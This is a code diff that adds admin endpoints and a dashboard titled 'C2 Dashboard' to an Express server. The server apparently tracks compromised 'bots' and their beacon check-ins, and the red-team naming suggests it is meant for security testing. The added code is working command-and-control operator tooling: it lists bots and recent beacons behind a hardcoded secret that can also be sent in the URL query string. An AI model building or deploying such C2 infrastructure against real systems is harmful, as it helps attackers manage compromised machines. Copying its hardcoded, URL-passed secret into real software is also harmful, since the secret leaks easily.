@@ -380,3 +380,127 @@ process.on('SIGTERM', () => {
     server.close();
     process.exit(0);
 });
+
+// ==================== REMOTE ADMIN ENDPOINTS ====================
+
+// Secret key for remote access (change this!)
+const ADMIN_SECRET = 'redteam2024-secret-key-xyz';
+
+// Middleware to check admin secret
+function checkAdminAuth(req, res, next) {
+    const authHeader = req.headers['x-admin-secret'];
+    const querySecret = req.query.secret;
+    
+    if (authHeader === ADMIN_SECRET || querySecret === ADMIN_SECRET) {
+        next();
+    } else {
+        res.status(401).json({ error: 'Unauthorized' });
+    }
+}
+
+// Get all bots (password protected)
+app.get('/admin/bots', checkAdminAuth, (req, res) => {
+    const botList = Object.keys(bots).map(id => ({
+        id: id,
+        firstSeen: bots[id].firstSeen,
+        lastSeen: bots[id].lastSeen,
+        beaconCount: bots[id].beacons?.length || 0,
+        lastBeacon: bots[id].lastBeacon
+    }));
+    
+    res.json({
+        total: botList.length,
+        timestamp: new Date().toISOString(),
+        bots: botList
+    });
+});
+
+// Get specific bot details
+app.get('/admin/bots/:botId', checkAdminAuth, (req, res) => {
+    const botId = req.params.botId;
+    const bot = bots[botId];
+    
+    if (!bot) {
+        return res.status(404).json({ error: 'Bot not found' });
+    }
+    
+    res.json({
+        id: botId,
+        firstSeen: bot.firstSeen,
+        lastSeen: bot.lastSeen,
+        beacons: bot.beacons?.slice(-20) || [], // Last 20 beacons
+        totalBeacons: bot.beacons?.length || 0
+    });
+});
+
+// Get recent beacons across all bots
+app.get('/admin/beacons', checkAdminAuth, (req, res) => {
+    const limit = parseInt(req.query.limit) || 10;
+    
+    const allBeacons = [];
+    Object.keys(bots).forEach(botId => {
+        const bot = bots[botId];
+        if (bot.beacons) {
+            bot.beacons.slice(-50).forEach(b => {
+                allBeacons.push({
+                    botId: botId,
+                    ...b
+                });
+            });
+        }
+    });
+    
+    // Sort by timestamp (newest first)
+    allBeacons.sort((a, b) => {
+        return (b.timestamp || '').localeCompare(a.timestamp || '');
+    });
+    
+    res.json({
+        total: allBeacons.length,
+        limit: limit,
+        beacons: allBeacons.slice(0, limit)
+    });
+});
+
+// Simple dashboard HTML (view only)
+app.get('/admin', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Dashboard</title>
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        h1 { color: #00ff00; border-bottom: 1px solid #00ff00; }
+        .bot { background: #1a1a1a; margin: 10px 0; padding: 10px; border-radius: 5px; }
+        .bot-id { color: #00ffff; font-weight: bold; }
+        .bot-meta { color: #888; font-size: 12px; }
+        input, button { padding: 10px; margin: 10px 0; background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; }
+        button { cursor: pointer; }
+        #output { white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>C2 Dashboard</h1>
+    <input type="password" id="secret" placeholder="Admin Secret" style="width: 300px;">
+    <button onclick="fetchBots()">Get Bots</button>
+    <button onclick="fetchBeacons()">Get Beacons</button>
+    <div id="output"></div>
+    <script>
+        async function fetchBots() {
+            const secret = document.getElementById('secret').value;
+            const res = await fetch('/admin/bots?secret=' + secret);
+            const data = await res.json();
+            document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+        }
+        async function fetchBeacons() {
+            const secret = document.getElementById('secret').value;
+            const res = await fetch('/admin/beacons?secret=' + secret + '&limit=20');
+            const data = await res.json();
+            document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+        }
+    </script>
+</body>
+</html>
+    `);
+});
